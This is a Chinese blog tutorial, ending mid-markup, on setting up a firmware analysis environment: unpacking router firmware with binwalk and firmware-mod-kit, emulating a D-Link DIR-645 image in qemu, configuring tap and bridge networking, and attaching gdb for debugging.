工具包可用于提取固件中的文档系统，然后对其进行修改，并重新打包成固件。我们可以使用它对固件做定制化的修改，但是也有可能被恶意地用于在固件中添加后门等，所以在下载固件时应到官方网站下载，并检查固件是否被修改过。</p><p>该工具包支持以下固件：</p><blockquote><p>DD-WRT v23 tested - versions v23 SP1 and later are compatible (soon older versions too).<br>DD-WRT v24 tested<br>OpenWrt White Russian tested<br>OpenWrt Kamikaze untested (should work) - not really necessary, based on OpenWrt has its Image Builder.<br>FreeWrt untested - should work ok<br>HyperWrt untested<br>Ewrt untested<br>Sveasoft Alchemy untested<br>Sveasoft Talisman untested<br>Linksys / other vendor not supported by scripts yet - haven’t added cramfs handling<br>ASUS WL-330G untested - should work ok<br>ASUS WL-520G untested - should work ok<br>ASUS WL-530G supported<br>ASUS WL-550G untested - should work ok<br>Trendnet TEW-632BRP tested<br>DLink DIR-615 untested<br>many others* untested</p></blockquote><p>可在 <a href="https://code.google.com/archive/p/firmware-mod-kit/" target="_blank" rel="noopener">google code</a> 下载 Firmware Mod Kit v0.99 安装包，然后解压安装，安装前需要先安装相应的依赖库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install git build-essential zlib1g-dev liblzma-dev python-magic</span><br><span class="line"></span><br><span class="line"><span class="variable">$cd</span> firmware-mod-kit/src</span><br><span class="line">$./configure &amp;&amp; make</span><br></pre></td></tr></table></figure><p>firmware-mod-kit 中包含以下几个工具脚本：</p><blockquote><p>extract-firmware.sh：解包固件<br>build-firmware.sh：重新打包固件<br>check_for_upgrade.sh：检查更新<br>unsquashfs_all.sh：解包提取出来的 squashfs 文档</p></blockquote><h2 id="固件对比"><a href="#固件对比" class="headerlink" title="固件对比"></a>固件对比</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/bmaia/binwall</span><br><span class="line"></span><br><span class="line">python binwally.py dir1 dir2</span><br></pre></td></tr></table></figure><h2 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h2><p>因为例如 MIPS、ARM 指令集是无法直接在 X86 的指令集机器上直接运行的，所以就需要使用一个模拟环境，可以用 qemu或者Firmadyne来模拟</p><h3 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h3><p>qemu有系统模式和用户模式。对于只想模拟单个程序的话使用用户模拟即可；对于整个设备（摄像头、路由器等）的环境来说，使用系统模式比较方便</p><h4 id="用户模式"><a href="#用户模式" class="headerlink" title="用户模式"></a>用户模式</h4><p>以 dir645_FW_103.bin 为例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ wget ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP</span><br><span class="line">$ binwalk dir645_FW_103.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: <span class="string">"dev=/dev/mtdblock/2"</span></span><br><span class="line">112           0x70            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 4237576 bytes</span><br><span class="line">1441904       0x160070        PackImg section delimiter tag, little endian size: 3169792 bytes; big endian size: 6172672 bytes</span><br><span class="line">1441936       0x160090        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 6170670 bytes, 2216 inodes, blocksize: 262144 bytes, created: 2012-10-09 10:24:09</span><br><span class="line"></span><br><span class="line">$ binwalk -Me dir645_FW_103.bin </span><br><span class="line">$ ls</span><br><span class="line">dir645_FW_103.bin*  _dir645_FW_103.bin.extracted/</span><br><span class="line">$ file _dir645_FW_103.bin.extracted/squashfs-root/bin/busybox </span><br><span class="line">_dir645_FW_103.bin.extracted/squashfs-root/bin/busybox: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, stripped</span><br></pre></td></tr></table></figure><p>查看<code>squashfs-root/bin/busybox</code>为mips32 静态链接程序,所以用<code>qemu-mips-static</code>来模拟，启动单个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cp /usr/bin/qemu-mips-static .</span><br><span class="line">$ sudo chroot . ./qemu-mips-static ./sbin/httpd</span><br></pre></td></tr></table></figure><h4 id="系统模式"><a href="#系统模式" class="headerlink" title="系统模式"></a>系统模式</h4><p>下载不同架构的kernel和文件系统，用来系统模拟。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -r -np -nH -R index.html https://people.debian.org/~aurel32/qemu/</span><br></pre></td></tr></table></figure><p><img alt="image-20200707180834331" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200707180834331.png" class="lozad"></p><p>以mips为例</p><p><img alt="image-20200707181153719" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200707181153719.png" class="lozad"></p><p>先在物理机添加个虚拟网卡tap0并配置ip，以便和虚拟机进行通信</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">$ sudo tunctl -t tap0 -u `whoami`</span><br><span class="line">Set <span class="string">'tap0'</span> persistent and owned by uid 1000</span><br><span class="line">$ ifconfig </span><br><span class="line">ens32: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.164.137  netmask 255.255.255.0  broadcast 192.168.164.255</span><br><span class="line">        inet6 fe80::f47c:851e:6b2a:ca13  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:44:85:45  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 1273210  bytes 1632037231 (1.6 GB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 262339  bytes 15789435 (15.7 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 564  bytes 42862 (42.8 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 564  bytes 42862 (42.8 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">$ sudo ifconfig tap0 192.168.164.139/24</span><br><span class="line">$ ifconfig </span><br><span class="line">ens32: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.164.137  netmask 255.255.255.0  broadcast 192.168.164.255</span><br><span class="line">        inet6 fe80::f47c:851e:6b2a:ca13  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:44:85:45  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 1272982  bytes 1632018319 (1.6 GB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 262111  bytes 15770766 (15.7 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 544  bytes 41616 (41.6 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 544  bytes 41616 (41.6 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">tap0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.164.139  netmask 255.255.255.0  broadcast 192.168.164.255</span><br><span class="line">        inet6 fe80::2054:a3ff:fead:808f  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 22:54:a3:ad:80:8f  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 17  bytes 3330 (3.3 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 5  bytes 430 (430.0 B)</span><br><span class="line">        TX errors 0  dropped 3 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><p>需要注意的是配置的tap0的ip要和本地ip在同一个网段，如果配置错误，可以<code>sudo tunctl -d tap0</code>删除重新配置</p><p>然后启动虚拟机，虚拟机默认用户密码为root/root，登录后我们需要配置虚拟机ip地址与tap0也在同一网段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append <span class="string">"root=/dev/sda1 console=tty0"</span> -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Debian GNU/Linux 6.0 debian-mips ttyS0</span><br><span class="line">debian-mips login: root</span><br><span class="line">Password: </span><br><span class="line">Last login: Wed Jul  8 05:16:50 UTC 2020 on ttyS0</span><br><span class="line">Linux debian-mips 2.6.32-5-4kc-malta <span class="comment">#1 Tue Sep 24 00:02:22 UTC 2013 mips</span></span><br><span class="line">root@debian-mips:~<span class="comment"># ifconfig </span></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 52:54:00:12:34:56  </span><br><span class="line">          inet6 addr: fe80::5054:ff:fe12:3456/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:16 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:2988 (2.9 KiB)</span><br><span class="line">          Interrupt:10 Base address:0x1020 </span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:9 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:9 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:672 (672.0 B)  TX bytes:672 (672.0 B)</span><br><span class="line"></span><br><span class="line">root@debian-mips:~<span class="comment"># ifconfig eth0 192.168.164.140/24</span></span><br><span class="line">root@debian-mips:~<span class="comment"># ifconfig </span></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 52:54:00:12:34:56  </span><br><span class="line">          inet addr:192.168.164.140  Bcast:192.168.164.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::5054:ff:fe12:3456/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:87 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:16 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:5220 (5.0 KiB)  TX bytes:2988 (2.9 KiB)</span><br><span class="line">          Interrupt:10 Base address:0x1020 </span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:9 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:9 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:672 (672.0 B)  TX bytes:672 (672.0 B)</span><br><span class="line"></span><br><span class="line">root@debian-mips:~<span class="comment"># ping 192.168.164.139</span></span><br><span class="line">PING 192.168.164.139 (192.168.164.139) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.164.139: icmp_req=1 ttl=64 time=14.7 ms</span><br><span class="line"></span><br><span class="line">root@debian-mips:~<span class="comment"># ping 192.168.164.137</span></span><br><span class="line">PING 192.168.164.137 (192.168.164.137) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.164.137: icmp_req=1 ttl=64 time=2.28 ms</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">参数说明：</span><br><span class="line">-M 指定开发板 你能够使用-M ?參数来获取该qemu版本号支持的全部单板</span><br><span class="line">-kernel 内核镜像路径</span><br><span class="line">-hda/-hdb IDE硬盘镜像</span><br><span class="line">-append 内核启动参数 内核命令行</span><br><span class="line">-s 等同于-g 1234</span><br></pre></td></tr></table></figure><p>然后在物理机用python启动一个简单的ftp服务器，在虚拟机里面接受固件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ tar -cvf squashfs-root.tar squashfs-root/</span><br><span class="line">$ python -m SimpleHTTPServer 8888</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8888 ...</span><br><span class="line">192.168.164.140 - - [08/Jul/2020 00:33:18] <span class="string">"GET /squashfs-root.tar HTTP/1.0"</span> 200</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@debian-mips:~<span class="comment"># wget http://192.168.164.137:8888/squashfs-root.tar</span></span><br><span class="line">--2020-07-08 07:33:18--  http://192.168.164.137:8888/squashfs-root.tar</span><br><span class="line">Connecting to 192.168.164.137:8888... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 29675520 (28M) [application/x-tar]</span><br><span class="line">Saving to: “squashfs-root.tar”</span><br><span class="line"></span><br><span class="line">100%[======================================&gt;] 29,675,520  2.96M/s   <span class="keyword">in</span> 8.0s    </span><br><span class="line"></span><br><span class="line">2020-07-08 07:33:26 (3.53 MB/s) - “squashfs-root.tar” saved [29675520/29675520]</span><br><span class="line"></span><br><span class="line">root@debian-mips:~<span class="comment"># ls</span></span><br><span class="line">squashfs-root.tar</span><br><span class="line">root@debian-mips:~<span class="comment"># tar -xvf squashfs-root.tar</span></span><br></pre></td></tr></table></figure><p>最后挂载文件，就可以开启固件里面的服务了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount -o <span class="built_in">bind</span> /dev/ ./squashfs-root/dev/</span><br><span class="line">mount -t proc /proc/ ./squashfs-root/proc/</span><br><span class="line">chroot ./squashfs-root sh</span><br></pre></td></tr></table></figure><p>以上配置网络的方法访问不了外网，而且手动配置的ip可能会失效，需要重新配置。</p><p>启动gdb和gdbserver开始调试</p><p>在qemu虚拟机里面运行下面的命令来启动调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdbserver.mipsbe attach 0.0.0.0:12345 pid</span><br><span class="line">或者 </span><br><span class="line">gdbserver.mipsbe 0.0.0.0:6666 ./test</span><br></pre></td></tr></table></figure><p>在Ubuntu主机里面运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line">gef➤ <span class="built_in">set</span> architecture mips      设置架构gdb-multiarch</span><br><span class="line">gef➤ <span class="built_in">set</span> architecture mips      设置架构</span><br><span class="line">The target architecture is assumed to be mips</span><br><span class="line">gef➤ gef-remote -q 192.168.1.20:2333     远程链接    或者target remote 192.168.1.20:2333</span><br><span class="line">gef➤ handle SIG32 pass            忽略一些信号，不然gdb会到处停很难受</span><br><span class="line">gef➤ handle SIG33 pass</span><br><span class="line">gef➤ handle SIG43 pass</span><br></pre></td></tr></table></figure><p>我把上述过程写了脚本方便启动</p><h4 id="start-py"><a href="#start-py" class="headerlink" title="start.py"></a>start.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># vim:fenc=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">cmd = <span class="string">'# '</span></span><br><span class="line">current_path = os.getcwd()</span><br><span class="line">firware_path=<span class="string">'/home/iot/tools/firmware-analysis-toolkit/firmadyne/vulfirmware/example1/_dir645_FW_103.bin.extracted/'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'login: '</span>, <span class="string">'root'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Password: '</span>, <span class="string">'root'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'ifconfig eth0 192.168.1.1'</span>)</span><br><span class="line">    r2=process(<span class="string">'sh'</span>)</span><br><span class="line">    r2.sendlineafter(<span class="string">'$ '</span>,<span class="string">'cd &#123;&#125;'</span>.format(firware_path))</span><br><span class="line">    r2.sendlineafter(<span class="string">'$ '</span>,<span class="string">'tar -cvf squashfs-root.tar squashfs-root/'</span>)</span><br><span class="line">    r2.sendlineafter(<span class="string">'$ '</span>,<span class="string">'python -m SimpleHTTPServer 8888'</span>)</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'wget http://192.168.1.2:8888/squashfs-root.tar'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'tar -xvf squashfs-root.tar'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'mount -o bind /dev/ ./squashfs-root/dev/'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'mount -t proc /proc/ ./squashfs-root/proc/'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'chroot ./squashfs-root sh'</span>)</span><br><span class="line">    r2.close()</span><br><span class="line">    r.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    os.system(<span class="string">'sudo tunctl -t tap0 -u iot'</span>)</span><br><span class="line">    os.system(<span class="string">'sudo ifconfig tap0 192.168.1.2/24'</span>)</span><br><span class="line"></span><br><span class="line">    exploit(process(<span class="string">'./run.sh'</span>))</span><br></pre></td></tr></table></figure><h4 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line">qemu-system-mipsel -M malta \</span><br><span class="line">-kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">-hda debian_wheezy_mipsel_standard.qcow2 \</span><br><span class="line">-append <span class="string">"root=/dev/sda1 console=tty0"</span> \</span><br><span class="line">-net nic -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure><h4 id="配置qemu-system网络"><a href="#配置qemu-system网络" class="headerlink" title="配置qemu-system网络"></a>配置qemu-system网络</h4><p>qemu想要访问外网，只需再创建一个网桥，将tap0接口添加到网桥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install uml-utilities bridge-utils</span><br></pre></td></tr></table></figure><p>创建网桥，名字是 <code>virbr0</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo brctl addbr virbr0 </span><br><span class="line">sudo ifconfig virbr0 192.168.122.1/24 up</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/t/firmware-analysis-toolkit&gt; sudo brctl addbr virbr0</span><br><span class="line">iot@attifyos ~/t/firmware-analysis-toolkit&gt; sudo ifconfig virbr0 192.168.122.1/24 up</span><br><span class="line">iot@attifyos ~/t/firmware-analysis-toolkit&gt; ifconfig </span><br><span class="line">ens32: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.164.137  netmask 255.255.255.0  broadcast 192.168.164.255</span><br><span class="line">        inet6 fe80::f47c:851e:6b2a:ca13  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:44:85:45  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 135232  bytes 156937910 (156.9 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 45471  bytes 2897770 (2.8 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 10571  bytes 1888940 (1.8 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 10571  bytes 1888940 (1.8 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">virbr0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.122.1  netmask 255.255.255.0  broadcast 192.168.122.255</span><br><span class="line">        inet6 fe80::a061:b2ff:fea9:466d  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether a2:61:b2:a9:46:6d  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 22  bytes 2766 (2.7 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><p>创建 <code>tap</code> 接口，名字为 <code>tap0</code>，并添加到网桥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo tunctl -t tap0 </span><br><span class="line">sudo ifconfig tap0 192.168.122.11/24 up</span><br><span class="line">sudo brctl addif virbr0 tap0</span><br></pre></td></tr></table></figure><p>修改主机网络接口配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sudo</span> vim /etc/network/interfaces</span><br></pre></td></tr></table></figure><p>如果网卡名不是eth0换成对应网卡名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># interfaces(5) file used by ifup(8) and ifdown(8)</span></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto virbr0</span><br><span class="line">iface virbr0 inet dhcp</span><br><span class="line">   bridge_ports eth0</span><br></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/networking restart</span><br></pre></td></tr></table></figure><p>启动qemu</p><figure class="highlight 